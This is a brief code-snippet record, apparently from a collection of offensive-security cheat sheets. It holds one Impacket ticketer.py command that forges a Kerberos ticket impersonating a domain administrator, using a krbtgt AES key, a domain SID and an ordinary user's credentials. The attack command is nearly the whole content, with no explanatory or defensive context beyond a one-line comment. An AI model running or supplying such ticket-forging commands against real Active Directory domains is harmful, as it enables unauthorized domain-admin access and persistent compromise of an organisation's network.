---
id: b1f9362e-e5c9-4f41-b333-88ab23cd4655
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:04.905354+00:00'
updated_at: '2023-04-10T20:26:34.688553+00:00'
---

# Code Snippet b1f9362e

**Language**: ps1

```ps1
# baduser argument will be ignored
ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
```


